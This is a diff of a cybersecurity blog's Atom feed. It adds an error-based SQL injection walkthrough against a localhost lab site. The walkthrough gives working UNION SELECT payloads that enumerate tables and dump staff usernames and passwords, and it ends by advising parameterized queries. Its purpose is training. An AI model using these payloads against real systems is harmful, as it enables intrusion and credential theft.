@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-06-04T11:24:44-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Big Brooklyn</title><subtitle>Cybersecurity Blog + Portfolio</subtitle><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><entry><title type="html">Command Injection &amp;amp; Remote Command Injection</title><link href="http://localhost:4000/blog/cybersecurity/2025/06/02/RCE.html" rel="alternate" type="text/html" title="Command Injection &amp;amp; Remote Command Injection" /><published>2025-06-02T00:00:00-04:00</published><updated>2025-06-02T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/06/02/RCE</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/06/02/RCE.html"><![CDATA[<p><img src="http://art.vx-underground.org/art/pancak3_deer_skeleton_humanoid_wearing_a_hoodie_in_the_style_of_71e7dc3b-d083-4668-a6eb-b8f10b9c962a.png" alt="Set up Listener" width="600" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-06-04T17:32:11-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Big Brooklyn</title><subtitle>Cybersecurity Blog + Portfolio</subtitle><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><entry><title type="html">Command Injection &amp;amp; Remote Command Injection</title><link href="http://localhost:4000/blog/cybersecurity/2025/06/02/RCE.html" rel="alternate" type="text/html" title="Command Injection &amp;amp; Remote Command Injection" /><published>2025-06-02T00:00:00-04:00</published><updated>2025-06-02T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/06/02/RCE</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/06/02/RCE.html"><![CDATA[<p><img src="http://art.vx-underground.org/art/pancak3_deer_skeleton_humanoid_wearing_a_hoodie_in_the_style_of_71e7dc3b-d083-4668-a6eb-b8f10b9c962a.png" alt="Set up Listener" width="600" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>
 
 <p><em>What if a single line of input could give an attacker full control over a system? No passwords. No exploits. Just raw commands slipped in through the cracks.</em>
 That’s the threat behind <strong>Command Injection</strong> one of the most dangerous, yet often overlooked, vulnerabilities in modern applications.</p>
@@ -1270,7 +1270,182 @@ Content: s3cur3p@ssw0rd
 </code></pre>
 </div>
 
-<p>You just leaked creds. Over the front door. In plain sight.</p>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><category term="ctf" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Active Directory</title><link href="http://localhost:4000/blog/cybersecurity/2025/05/31/ADintro.html" rel="alternate" type="text/html" title="Active Directory" /><published>2025-05-31T00:00:00-04:00</published><updated>2025-05-31T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/05/31/ADintro</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/05/31/ADintro.html"><![CDATA[<p><img src="http://art.vx-underground.org/art/pancak3_satanic_computer_hackers_degen_dark_det_in_the_style_of_7e887c3c-d4a4-40d5-8718-097dc099bb36.png" alt="Set up Listener" width="500" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>
+<p>You just leaked creds. Over the front door. In plain sight.</p>
+
+<h1 id="error-based-sql-injection-walkthrough">Error-Based SQL Injection Walkthrough</h1>
+
+<p>We’re looking at a simple blog site vulnerable to <strong>error-based SQL Injection</strong>.</p>
+
+<p>Test URL:</p>
+
+<div class="code-block-container">
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sql">
+http://localhost:8000/index.php?id=1
+</code></pre>
+</div>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FGEO77cP9yRuYocXH9K-Ag.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<h4 id="step-1-identify-the-injection-point">Step 1: Identify the Injection Point</h4>
+
+<p>To confirm an SQLi vulnerability, we need to <em>break the query</em> and look for errors.</p>
+
+<p>Let’s tweak the URL slightly:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQLI</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sqli">
+http://localhost:8000/index.php?id=1'
+</code></pre>
+</div>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*yYsVgEO9cJCd7ctNDy2qeA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<p>we get this classic error:</p>
+
+<div class="alert-error">
+Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1... 
+</div>
+
+<p>That error confirms the input is unsanitized and directly injected into an SQL statement. We’re in.</p>
+
+<hr />
+
+<h4 id="step-2-column-count-with-union-injection">Step 2: Column Count with UNION Injection</h4>
+
+<p>To extract data, we’ll use the <code class="language-plaintext highlighter-rouge">UNION SELECT</code> method. But first, we need to figure out <strong>how many columns</strong> the original query returns.</p>
+
+<p>Try:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQLI</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sqli">
+http://localhost:8000/index.php?id=1 UNION SELECT 1
+</code></pre>
+</div>
+
+<p>If it throws:</p>
+
+<p><code class="language-plaintext highlighter-rouge">The used SELECT statements have a different number of columns...</code></p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4wPrWy4iunNK3DzOUxpWZw.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<p>…then the number of columns doesn’t match. Keep adding placeholders until it stops erroring:</p>
+
+<p><code class="language-plaintext highlighter-rouge">1 UNION SELECT 1,2
+1 UNION SELECT 1,2,3</code></p>
+
+<p>Once it works, we know the original query returns <strong>3 columns</strong>.</p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2Xa6KpQXbNllygPC77_yVA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<hr />
+
+<h4 id="step-3-control-the-output">Step 3: Control the Output</h4>
+
+<p>Right now, the site displays the <em>first</em> row from the results. We want it to show our injected data instead of the real article.</p>
+
+<p>To make the original query return <strong>no results</strong>, change the ID to something invalid, like <code class="language-plaintext highlighter-rouge">0</code>:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQLI</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sqli">
+http://localhost:8000/index.php?id=0 UNION SELECT 1,2,3
+</code></pre>
+</div>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*U1Udu5VDeodVns0GFVXjBA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<p>Now we control the output. Time to exfiltrate.</p>
+
+<hr />
+
+<h4 id="step-4-get-the-current-database">Step 4: Get the Current Database</h4>
+
+<p>Let’s see what database we’re in:</p>
+
+<p><code class="language-plaintext highlighter-rouge">0 UNION SELECT 1,2,database()</code></p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CdaJdtc9zIclISKtVmDzeQ.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<p>It returns:</p>
+
+<p><code class="language-plaintext highlighter-rouge">sqli_one</code></p>
+
+<hr />
+
+<h4 id="step-5-list-all-tables-in-the-database">Step 5: List All Tables in the Database</h4>
+
+<p>We’ll use the internal <code class="language-plaintext highlighter-rouge">information_schema</code> database to get table names:</p>
+
+<p><code class="language-plaintext highlighter-rouge">0 UNION SELECT 1,2,group_concat(table_name)
+FROM information_schema.tables
+WHERE table_schema = 'sqli_one'</code></p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*oFBVqmZ2f_S8dLFsmylD3A.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<p>We get:</p>
+
+<p><code class="language-plaintext highlighter-rouge">article,staff_users</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">staff_users</code> sounds spicy</p>
+
+<hr />
+
+<h4 id="step-6-discover-table-columns">Step 6: Discover Table Columns</h4>
+
+<p>Now let’s get the column names inside <code class="language-plaintext highlighter-rouge">staff_users</code>:</p>
+
+<p><code class="language-plaintext highlighter-rouge">0 UNION SELECT 1,2,group_concat(column_name)
+FROM information_schema.columns
+WHERE table_name = 'staff_users'</code></p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*mWZNsPiZLLRlEoIVbEYhdw.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<p>Result:</p>
+
+<p><code class="language-plaintext highlighter-rouge">id,username,password</code></p>
+
+<p>Now we’re ready to extract creds.</p>
+
+<hr />
+
+<h4 id="step-7-dump-the-data">Step 7: Dump the Data</h4>
+
+<p>Let’s pull the actual data from <code class="language-plaintext highlighter-rouge">staff_users</code>. To keep it readable, we format the output with a colon and line breaks:</p>
+
+<p><code class="language-plaintext highlighter-rouge">0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '&lt;br&gt;')
+FROM staff_users</code></p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*LItM8RdUP1gRaWo0JLmL2A.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<p>We’ve got usernames and hashed passwords on separate lines. Mission success.</p>
+
+<p>Always remember: SQLi like this happens because of <strong>poor input sanitization</strong> and <strong>unsafely constructed SQL queries</strong>. Use parameterized queries (prepared statements) to shut this down.</p>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><category term="ctf" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Active Directory</title><link href="http://localhost:4000/blog/cybersecurity/2025/05/31/ADintro.html" rel="alternate" type="text/html" title="Active Directory" /><published>2025-05-31T00:00:00-04:00</published><updated>2025-05-31T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/05/31/ADintro</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/05/31/ADintro.html"><![CDATA[<p><img src="http://art.vx-underground.org/art/pancak3_satanic_computer_hackers_degen_dark_det_in_the_style_of_7e887c3c-d4a4-40d5-8718-097dc099bb36.png" alt="Set up Listener" width="500" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>
 
 <p><strong>What is Active Directory?</strong>
 Active Directory is a service developed by Microsoft that helps manage and organize computers, users, and other resources on a network. Think of it like a digital phonebook + control center that stores info about everything in a Windows domain (like usernames, passwords, computers, printers, etc.).</p>
